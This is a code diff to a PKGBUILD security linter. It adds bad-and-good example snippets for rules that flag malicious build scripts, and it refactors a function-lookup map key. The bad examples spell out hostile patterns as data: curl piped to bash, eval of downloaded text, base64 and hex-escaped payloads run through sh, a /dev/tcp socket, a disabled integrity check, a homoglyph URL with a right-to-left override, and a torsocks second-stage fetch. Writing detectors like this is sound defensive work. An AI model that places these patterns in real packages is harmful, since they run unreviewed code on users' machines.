@@ -21,6 +21,12 @@ var execRules = []Rule{
 			"tools that only wanted metadata (`makepkg --printsrcinfo`, AUR helpers rendering a " +
 			"preview). Top-level code should be limited to variable assignments.",
 		Check: checkTopLevelExec,
+		Bad: `pkgname=foo
+curl -fsSL https://example.com/install.sh | bash   # runs the moment the PKGBUILD is sourced`,
+		Good: `pkgname=foo
+build() {
+  make   # keep commands inside build()/package(), never at top level
+}`,
 	},
 	{
 		ID:       "PB302",
@@ -29,6 +35,12 @@ var execRules = []Rule{
 		Doc: "eval executes a string as code, defeating static review: what actually runs is " +
 			"assembled at build time. Almost every legitimate use has a plain-bash equivalent.",
 		Check: checkEval,
+		Bad: `build() {
+  eval "$(curl -fsSL https://example.com/env.sh)"
+}`,
+		Good: `build() {
+  make   # call commands directly instead of eval-ing generated text
+}`,
 	},
 	{
 		ID:       "PB303",
@@ -38,6 +50,13 @@ var execRules = []Rule{
 			"is the canonical way to smuggle a payload past human review. There is no legitimate " +
 			"reason for a PKGBUILD to execute decoded blobs.",
 		Check: checkDecodeExec,
+		Bad: `build() {
+  echo "$payload" | base64 -d | bash
+  printf '\x63\x75\x72\x6c' | sh   # the same thing, spelled in escapes
+}`,
+		Good: `build() {
+  make   # ship readable source, never decode-and-run an embedded blob
+}`,
 	},
 	{
 		ID:       "PB304",
@@ -47,6 +66,14 @@ var execRules = []Rule{
 			"to send, with no checksum, no review, and no record. This includes `eval \"$(curl ...)\"`, " +
 			"`sh -c \"$(wget ...)\"` and `source <(curl ...)` variants.",
 		Check: checkDownloadExec,
+		Bad: `build() {
+  curl -fsSL https://example.com/install.sh | sh
+}`,
+		Good: `source=("https://example.com/install.sh")
+sha256sums=('...')
+build() {
+  sh install.sh   # fetched and checksummed via source=, then run
+}`,
 	},
 	{
 		ID:       "PB305",
@@ -55,6 +82,13 @@ var execRules = []Rule{
 		Doc: "/dev/tcp and /dev/udp redirections are bash's built-in network sockets — in a " +
 			"PKGBUILD they are typically reverse shells or exfiltration, never packaging.",
 		Check: checkDevTCP,
+		Bad: `build() {
+  exec 3<>/dev/tcp/example.com/443
+}`,
+		Good: `build() {
+  # no raw network sockets; declare any remote data in source=
+  make
+}`,
 	},
 	{
 		ID:       "PB306",
@@ -64,6 +98,13 @@ var execRules = []Rule{
 			"be statically reviewed. In a PKGBUILD, hiding *which program runs* is itself a signal: " +
 			"obfuscation is what this rule flags.",
 		Check: checkDynamicCommands,
+		Bad: `build() {
+  runner=$(echo bWFrZQ== | base64 -d)
+  $runner   # command name produced at runtime; unresolvable statically
+}`,
+		Good: `build() {
+  make   # name the command literally
+}`,
 	},
 	{
 		ID:       "PB307",
@@ -74,6 +115,12 @@ var execRules = []Rule{
 			"Variables nested so that they expand to tens of mebibytes are reported here too: past that " +
 			"point pkglint stops expanding, and what depends on them goes unanalyzed.",
 		Check: checkObfuscatedLiterals,
+		Bad: `build() {
+  printf '\x63\x75\x72\x6c\x20\x2d\x4f\x20\x68\x74\x74\x70' | sh
+}`,
+		Good: `build() {
+  make   # keep commands as readable text, not escape sequences
+}`,
 	},
 	{
 		ID:       "PB308",
@@ -85,6 +132,12 @@ var execRules = []Rule{
 			"checks or tamper with fetching and packaging. Package functions are prepare/build/check/" +
 			"package/package_*/pkgver only.",
 		Check: checkMakepkgFuncOverride,
+		Bad: `# Redefining a makepkg internal disables its integrity checks:
+verify_integrity_one() { return 0; }
+build() { make; }`,
+		Good: `# Only define package functions; leave makepkg's internals to makepkg.
+build() { make; }
+package() { make DESTDIR="$pkgdir" install; }`,
 	},
 	{
 		ID:       "PB309",
@@ -98,6 +151,15 @@ var execRules = []Rule{
 			"of a name the reader trusts, and is an error; a label written wholly in another script is " +
 			"reported for review. Non-ASCII text in a URL's path, pkgdesc or a comment is not judged.",
 		Check: checkHiddenUnicode,
+		Bad: "source=(\"https://gіthub.com/example/foo/archive/v$pkgver.tar.gz\")   # a Cyrillic і\n" +
+			"build() {\n" +
+			"  # the RLO below reverses how the rest of the line renders\n" +
+			"  make ‮install\n" +
+			"}",
+		Good: `source=("https://github.com/example/foo/archive/v$pkgver.tar.gz")
+build() {
+  make install   # plain ASCII, renders exactly as it executes
+}`,
 	},
 	{
 		ID:       "PB310",
@@ -111,6 +173,11 @@ var execRules = []Rule{
 			"xsnow/xsnow-bin incident of August 2026, whose build() pulled a second stage through " +
 			"torsocks; generic network access is PB201 and PB501.",
 		Check: checkAnonymizedFetch,
+		Bad: `build() {
+  torsocks curl -fsSLO https://example.com/stage2.tar.gz
+}`,
+		Good: `source=("https://example.com/stage2-$pkgver.tar.gz")
+sha256sums=('...')`,
 	},
 }
 
@@ -893,14 +960,14 @@ func redirectsOutput(stmt *syntax.Stmt) bool {
 // metadata would care about: it opens no file for writing, starts no
 // interpreter, and reaches no network. pure carries the verdict for the file's
 // own functions, so a call to a helper is judged by what the helper does.
-func (ctx *Context) inert(c Command, pure map[string]bool) bool {
+func (ctx *Context) inert(c Command, pure map[fnKey]bool) bool {
 	if c.Name == "" {
 		return false // a name assembled at run time is not reviewable
 	}
 	// A PKGBUILD that supplies the body decides what the name means: `warning`
 	// is libmakepkg's banner right up until the file writes one of its own.
 	if ctx.definesFunc(c, c.Name) {
-		return pure[c.Unit.Path+"\x00"+c.Name]
+		return pure[fnKey{c.Unit.Path, c.Name}]
 	}
 	return benignTopLevel[c.Name] || pureTopLevelUse(c)
 }
@@ -917,20 +984,20 @@ func (ctx *Context) inert(c Command, pure map[string]bool) bool {
 // nothing. Two helpers that call each other come out pure, which a depth-first
 // walk would need cycle detection to get right, while a body that reaches a
 // downloader through any number of hops drops every caller along the way.
-func (ctx *Context) funcPurity() map[string]bool {
+func (ctx *Context) funcPurity() map[fnKey]bool {
 	if ctx.pureFn != nil {
 		return ctx.pureFn
 	}
-	ctx.pureFn = map[string]bool{}
+	ctx.pureFn = map[fnKey]bool{}
 	if len(ctx.funcDecls) == 0 {
 		return ctx.pureFn
 	}
-	byFn := make(map[string][]Command, len(ctx.funcDecls))
+	byFn := make(map[fnKey][]Command, len(ctx.funcDecls))
 	for _, c := range ctx.cmds {
 		if c.Fn == "" {
 			continue
 		}
-		key := c.Unit.Path + "\x00" + c.Fn
+		key := fnKey{c.Unit.Path, c.Fn}
 		byFn[key] = append(byFn[key], c)
 	}
 	pure := ctx.pureFn
@@ -950,7 +1017,7 @@ func (ctx *Context) funcPurity() map[string]bool {
 	return pure
 }
 
-func (ctx *Context) bodyInert(cmds []Command, fd *syntax.FuncDecl, pure map[string]bool) bool {
+func (ctx *Context) bodyInert(cmds []Command, fd *syntax.FuncDecl, pure map[fnKey]bool) bool {
 	for _, c := range cmds {
 		if !ctx.inert(c, pure) {
 			return false
@@ -1573,7 +1640,7 @@ func (ctx *Context) funcSinks(c Command, seen map[*syntax.FuncDecl]bool) []Comma
 		return nil
 	}
 	var out []Command
-	for _, fd := range ctx.allFuncDecls[c.Unit.Path+"\x00"+c.Name] {
+	for _, fd := range ctx.allFuncDecls[fnKey{c.Unit.Path, c.Name}] {
 		if seen[fd] {
 			continue
 		}
